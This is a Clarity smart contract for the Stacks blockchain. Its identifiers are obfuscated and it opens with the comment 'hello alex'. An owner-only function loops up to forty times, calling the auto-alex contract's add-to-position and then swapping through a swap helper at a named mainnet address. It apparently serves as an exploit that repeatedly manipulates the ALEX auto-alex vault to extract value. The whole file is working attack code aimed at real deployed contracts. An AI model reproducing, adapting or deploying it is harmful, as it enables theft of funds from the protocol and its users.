;; hello alex

(define-data-var FzGna principal tx-sender)
(define-constant ij7dS (err u1377))


(define-private (check-is-owner)
  (ok (asserts! (is-eq tx-sender (var-get FzGna)) ij7dS))
)
(define-public (start-Ri8iV (aynGy uint) (lDGub uint) (ZHjWV uint))
      (let
          (
              (hdlBD (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position aynGy)))
              (nZSNj (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 get-given-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex hdlBD)))
          )
          (try! (check-is-owner))
          (print nZSNj)
          (print aynGy)

          (get nZSNj (fold Ri8iV 0x000000000000000000000000000000000000000000000000000000000000000000000000000000 {aynGy: aynGy, nZSNj: nZSNj, lDGub: lDGub, ZHjWV: ZHjWV}))
          (print nZSNj)
          (ok true)
      )
)
(define-private (Ri8iV (i (buff 1)) (pakRD {aynGy: uint, nZSNj: uint, lDGub: uint, ZHjWV: uint}))
  (if (and (> (+ (get nZSNj pakRD) (get ZHjWV pakRD)) (get aynGy pakRD)) (> (get aynGy pakRD) u3000000000))
      (let
          (
              (Igr9w (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex get-token-given-position (get aynGy pakRD))))
          )
          (begin
          (print "a")
          (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex add-to-position (get aynGy pakRD)))
          (print "b")

          (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 swap-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token Igr9w (some (get lDGub pakRD))))
          (print pakRD)

          {aynGy: (get nZSNj pakRD), nZSNj: (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.swap-helper-v1-03 get-given-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.age000-governance-token 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.auto-alex Igr9w)), lDGub: (get lDGub pakRD), ZHjWV: (get ZHjWV pakRD)}
          )
      )
      pakRD
  )
)
